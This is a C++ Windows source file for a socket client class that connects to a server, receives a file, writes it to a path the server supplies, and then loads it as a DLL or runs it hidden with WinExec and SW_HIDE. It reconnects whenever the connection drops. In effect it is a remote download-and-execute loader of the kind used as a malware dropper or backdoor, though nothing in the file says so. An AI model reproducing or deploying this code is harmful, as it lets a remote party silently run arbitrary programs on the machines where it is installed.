#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include <string>

#include <Function.Internal.CommonControl/CommonControlTool.h>
#include <Function.Internal.FileControl/FileControlTool.h>

#pragma comment(lib ,"WS2_32.lib")

#pragma comment(lib ,DIRECTORY_LIB "Function\\Function.Internal.FileControl.lib")
#pragma comment(lib ,DIRECTORY_LIB "Function\\Function.Internal.RegistryControl.lib")


#include "ResourceClientObj.h"

BYTE CResourceClientObj::m_btResourceBag[MAX_BAG_LEN] = {0x13,0x60,0x05,0x73,0x40};
TCHAR CResourceClientObj::m_szServerIP[MAX_IP4_ADDRESS_LEN+1] = {0};
USHORT CResourceClientObj::m_uServerPort = 0;

CResourceClientObj::CResourceClientObj(void)
{
	WSADATA info;  
	if (WSAStartup(MAKEWORD(2,0), &info)) 
	{  
		Out(Errors,_T("Could not start WSA"));  
	}

	m_Socket = socket(AF_INET,SOCK_STREAM,0);  

	if (m_Socket == INVALID_SOCKET) {  
		Out(Errors,_T("INVALID_SOCKET"));  
	}
	//Listen(9000);

}


CResourceClientObj::~CResourceClientObj(void)
{
	WSACleanup(); 
}

/**
* 连接关闭事件，回调方法
* 
* 派生类实现具体断开连接业务处理
* 
*/
void CResourceClientObj::OnCloseConnect()
{
	ConnectServer(m_szServerIP,m_uServerPort);
}

bool CResourceClientObj::ConnectServer(LPCTSTR lpServerIP,USHORT uPort)
{
	hostent *he;  
	std::string error;  
	bool bRet = false;

	if (NULL == lpServerIP || uPort < 0 || uPort > 65535)
	{
		return false;
	}
#ifdef UNICODE
	std::string strServerIP(ws2s(lpServerIP));
#else
	std::string strServerIP(lpServerIP);
#endif

	OutA(OutputsA,"Connect Server %s:%d Starting.",strServerIP.c_str(),uPort);

	if ((he = gethostbyname(strServerIP.c_str())) == 0) {  
		error = strerror(errno);  
		OutA(ErrorsA,"Get Host By Name Error[%s].",error.c_str());
		return false;
	}  

	sockaddr_in addr;  
	addr.sin_family = AF_INET;  
	addr.sin_port = htons(uPort);  
	addr.sin_addr = *((in_addr *)he->h_addr);  
	memset(&(addr.sin_zero), 0, 8);   

	if (::connect(m_Socket, (sockaddr *) &addr, sizeof(sockaddr))) 
	{  
		error = strerror(WSAGetLastError());  
		OutA(ErrorsA,"Connect Server %s:%d Error[%s].",strServerIP.c_str(),uPort,error.c_str());
		bRet = false;
	}else
	{
		_tcsncpy_s(m_szServerIP,MAX_IP4_ADDRESS_LEN,lpServerIP,MAX_IP4_ADDRESS_LEN);
		m_uServerPort = uPort;
		bRet = true;
	}

	Runend(bRet,_T("Connect Server Stoping."));
	return bRet;
}

bool CResourceClientObj::Recv(PVOID lpMessage, DWORD dwMessageSize,bool bFlags)
{
	while (TRUE) 
	{  
		long lReadLen = recv(m_Socket,(CHAR *)lpMessage,dwMessageSize,bFlags);  

		switch(lReadLen) 
		{  
		case 0:
			OnCloseConnect();
			Out(Warning,_T("[0x%08X]Internet Connection Interrupted,Read Buffer Failed."),m_Socket);
			return false;
		case SOCKET_ERROR:  
			{
				std::string error = strerror(WSAGetLastError());  
				OutA(WarningA,"[0x%08X]Socket Internet Error,Read Buffer Failed.",m_Socket,error.c_str());
				return false;
			}
		default:
			if (lReadLen != dwMessageSize)
			{
				lpMessage = (PVOID)((ULONG)lpMessage + lReadLen);
				dwMessageSize -= lReadLen;
				if (dwMessageSize < 0)
				{
					Out(Warning,_T("[0x%08X]Read Size Incorrect,Should Read Size Is %d,Actual Read Size Is %d,Read Buffer Failed."),m_Socket,dwMessageSize+lReadLen,lReadLen);
					return false;
				}
				continue;
			}
			else
			{
				dwMessageSize = 0;
				return true;
			}
		}
	}  
	return true;
}

long CResourceClientObj::Send(PVOID lpMessage, DWORD dwMessageSize)
{
	long lReadLen = send(m_Socket,(PCHAR)lpMessage,dwMessageSize,0); 

	switch(lReadLen) 
	{  
	case SOCKET_ERROR:  
		{
			std::string error = strerror(WSAGetLastError());  
			OutA(WarningA,"[0x%08X]Socket Internet Error,Send Buffer Failed.",m_Socket,error.c_str());
			return 0;
		}
	default:
		return lReadLen;
	}

	return 0;
}

bool CResourceClientObj::ReadResource(PRESOURCEHANDLE pResourceReadInfo)
{
	while(true)
	{
		memset(pResourceReadInfo->pSocketReadBuf,0,pResourceReadInfo->dwSocketReadLen);

		if (Recv((PUCHAR)pResourceReadInfo->pSocketReadBuf,pResourceReadInfo->dwSocketReadLen,false))
		{
			if (NULL == pResourceReadInfo->hSocketFileHandle) return false;

			fseek(pResourceReadInfo->hSocketFileHandle,0,SEEK_END);
			fwrite(pResourceReadInfo->pSocketReadBuf,1,pResourceReadInfo->dwSocketReadLen,pResourceReadInfo->hSocketFileHandle);
			fflush(pResourceReadInfo->hSocketFileHandle);

			//当前读取索引加一
			pResourceReadInfo->dwSocketSendNum++;
			//如果下一次读取是最后一次读取,做数据更正.
			if (pResourceReadInfo->dwSocketSendNum == pResourceReadInfo->dwSocketSendMax)
			{
				if(0 == (pResourceReadInfo->dwSocketReadLen = pResourceReadInfo->dwRemaininglength))
					break;
			}
			//如果下一次读取索引比最大读取次数大,退出
			if (pResourceReadInfo->dwSocketSendNum > pResourceReadInfo->dwSocketSendMax)
			{
				break;
			}
		}
		else
		{
			return false;
		}
	}
	return UnInitResourceHander(pResourceReadInfo,&m_ResourceObj);
}

bool CResourceClientObj::InitResourceHander(PRESOURCEREADINFO pResourceObj,PRESOURCEHANDLE pResourceReadInfo)
{
	if (0 >= pResourceObj->dwResourceLen) return false;

	Out(Dbg,_T("Initialization Resource Hander Starting."));
	if (MAX_SOCKET_SEND_LEN < pResourceObj->dwResourceLen)
	{
		pResourceReadInfo->dwSocketSendNum		= 0;
		pResourceReadInfo->dwSocketReadLen		= MAX_SOCKET_SEND_LEN;
		pResourceReadInfo->dwSocketSendMax		= (DWORD)(pResourceObj->dwResourceLen / MAX_SOCKET_SEND_LEN);//因为发送时索引为0开始的,所以当有余数时,此处不加一

		pResourceReadInfo->dwRemaininglength	= (DWORD)(pResourceObj->dwResourceLen % MAX_SOCKET_SEND_LEN);
	} else {

		pResourceReadInfo->dwSocketSendNum		= 0;
		pResourceReadInfo->dwSocketReadLen		= pResourceObj->dwResourceLen;
		pResourceReadInfo->dwSocketSendMax		= 1;
		pResourceReadInfo->dwRemaininglength	= 0;
	}

	strncpy_s(pResourceReadInfo->szSocketFilePath,pResourceObj->szResourcePath,MAX_PATH);
	pResourceReadInfo->szSocketFilePath[MAX_PATH] = '\0';
	pResourceReadInfo->pSocketReadBuf = (PBYTE)malloc(pResourceReadInfo->dwSocketReadLen);

	//如果文件存在删除原有文件，并打开文件
	DeleteFileA(pResourceObj->szResourcePath);//如果文件存在删除原有文件，并打开文件

	OutA(OutputsA,"Resource Information: LEN = [%d] ID%s = [%s] MD5 = [%s] PATH = [%s].",pResourceObj->dwResourceLen,pResourceObj->szResourceID,pResourceObj->szResourceMD5,pResourceObj->szResourcePath);
	fopen_s(&pResourceReadInfo->hSocketFileHandle,pResourceReadInfo->szSocketFilePath,"wb");

	Runend(true,_T("Initialization Resource Hander Stoping."));
	return true;
}

bool CResourceClientObj::UnInitResourceHander(PRESOURCEHANDLE pResourceReadInfo,PRESOURCEREADINFO pResourceObj)
{
	Out(Dbg,_T("UnInitialization Resource Hander Starting. File End[%d].\n"),pResourceReadInfo->dwSocketReadLen);

	fclose(pResourceReadInfo->hSocketFileHandle);
	Sleep(1000);
	switch (pResourceObj->dwResourceType)
	{
	case TYPE_RESOURCE_EXECFILE:
		if (0 == stricmp(PathFindExtensionA(pResourceObj->szResourcePath),".DLL"))
		{
			OutA(OutputsA,("Resource[%s] Type: %s%s"),pResourceObj->szResourcePath,("TYPE_RESOURCE_EXECFILE"),strupr(PathFindExtensionA(pResourceObj->szResourcePath)));
			LoadLibraryA(pResourceObj->szResourcePath);
		}else
		{
			OutA(OutputsA,("Resource[%s] Type: %s%s"),pResourceObj->szResourcePath,("TYPE_RESOURCE_EXECFILE"),strupr(PathFindExtensionA(pResourceObj->szResourcePath)));
			WinExec(pResourceObj->szResourcePath,SW_HIDE);
		}
		break;
	case TYPE_RESOURCE_SYSTEM:
		OutA(OutputsA,("Resource[%s] Type: %s"),pResourceObj->szResourcePath,("TYPE_RESOURCE_SYSTEM"));
		LoadLibraryA(pResourceObj->szResourcePath);
		break;
	case TYPE_RESOURCE_DATAFILE:
		OutA(OutputsA,("Resource[%s] Type: %s"),pResourceObj->szResourcePath,("TYPE_RESOURCE_DATAFILE"));
		break;
	default:
		break;
	}

	free(pResourceReadInfo->pSocketReadBuf);

	memset(&m_ResourceObj,0,sizeof(m_ResourceObj));
	memset(&m_ResourceReadInfo,0,sizeof(m_ResourceReadInfo));

	Runend(true,_T("UnInitialization Resource Hander Successful."));
	return true;
}

bool CResourceClientObj::ExecuteCommand()
{
	/*
	读取数据长度，长度不足2byte直接返回，等待下次数据到达时再读取
	只读取2byte，false表示，不将读取到的数据从缓冲中删除，下次还是可以读到
	*/


	if( 0 == m_ResourceObj.dwResourceLen) 
	{
		if (Recv(&m_ResourceObj, sizeof(RESOURCEREADINFO),FALSE))
		{
			if (InitResourceHander(&m_ResourceObj,&m_ResourceReadInfo))
			{
				if (ReadResource(&m_ResourceReadInfo))
				{
					return true;
				}
			}
		}

	}

	return false;
}
